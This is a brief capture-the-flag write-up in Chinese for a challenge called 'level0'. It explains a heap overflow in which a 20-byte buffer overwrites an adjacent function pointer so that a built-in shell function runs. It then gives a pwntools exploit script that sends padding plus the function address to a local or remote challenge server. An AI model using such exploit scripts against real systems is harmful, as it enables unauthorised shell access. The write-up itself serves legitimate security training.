# level0

### 思路  
+ 注意到有一个hack函数可以拿shell
+ 程序大体逻辑是malloc两个块，一个是buf,一个是v4。其中v4接收8个bytes,作为一个函数指针传给v5后执行
+ 由于buf块只有20,读100个bytes可以溢出到v4。 将v4覆盖成hack地址即可
+ 使用gdb调试查看buf和v4的相对地址

###exp
```python
from pwn import *
context.log_level="debug"
pwn_file="./level0-welcome"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",22500)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

hack = 0x40075E
payload = 'a'*(0x20) + p64(hack)
r.sendline(payload)

r.interactive()
```
